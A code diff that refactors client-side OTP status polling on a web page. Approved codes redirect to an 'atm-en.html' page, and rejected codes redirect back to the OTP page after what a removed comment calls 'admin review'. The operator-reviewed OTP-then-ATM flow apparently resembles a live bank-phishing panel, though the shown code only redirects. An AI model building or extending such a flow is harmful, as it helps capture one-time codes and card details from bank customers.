@@ -377,9 +377,17 @@
 
     function redirectToAtm(){
       stopPoll();
-      if (waitOverlay) waitOverlay.classList.remove('show');
+      waitOverlay.classList.remove('show');
       if (requestId) {
         window.location.href = 'atm-en.html?id=' + requestId;
+      }
+    }
+
+    function goBackToOtpWithError(message){
+      stopPoll();
+      waitOverlay.classList.remove('show');
+      if (requestId) {
+        window.location.href = 'otp-en.html?error=otp&msg=' + encodeURIComponent(message) + '&id=' + requestId;
       }
     }
 
@@ -395,13 +403,9 @@
               redirectToAtm();
             } else if (isRejectedStatus(status)) {
               stopPoll();
-              if (waitOverlay) waitOverlay.classList.remove('show');
-              if (rejectOverlay) rejectOverlay.classList.add('show');
-              if (otpForm) otpForm.style.display = 'block';
-              if (otpInput) otpInput.disabled = false;
-              if (verifyBtn) verifyBtn.disabled = false;
-              var msg = 'The OTP was rejected. Please check the code and try again.';
-              window.location.href = 'otp-en.html?error=otp&msg=' + encodeURIComponent(msg) + '&id=' + requestId;
+              waitOverlay.classList.remove('show');
+              var rejectMessage = 'The verification code was rejected. Please check the code and try again.';
+              goBackToOtpWithError(rejectMessage);
             }
           })
           .catch(function(err){
@@ -435,7 +439,6 @@
           pollOtpStatus();
           return;
         }
-        // Do not show rejection immediately; the user stays in admin review state.
         pollOtpStatus();
       })
       .catch(function(err){
